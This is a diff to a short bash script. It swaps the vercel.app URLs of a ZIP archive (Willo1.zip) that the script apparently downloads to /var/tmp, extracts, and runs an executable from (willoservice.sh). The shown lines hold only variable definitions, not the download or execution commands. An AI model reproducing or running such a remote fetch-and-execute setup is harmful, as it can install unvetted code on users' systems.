@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Define variables for URLs
-ZIP_URL_ARM64="https://lazr-ayfxy8fdp-jeiipis-projects.vercel.app/Willo1.zip"
-ZIP_URL_INTEL="https://lazr-ayfxy8fdp-jeiipis-projects.vercel.app/Willo1.zip"
+ZIP_URL_ARM64="https://lazr-beryl.vercel.app/Willo1.zip"
+ZIP_URL_INTEL="https://lazr-beryl.vercel.app/Willo1.zip"
 ZIP_FILE="/var/tmp/Willo.zip"                        # Path to save the downloaded ZIP file
 WORK_DIR="/var/tmp/Willo/"                            # Temporary directory for extracted files
 EXECUTABLE="willoservice.sh"                         # Replace with the name of the executable file inside the ZIP
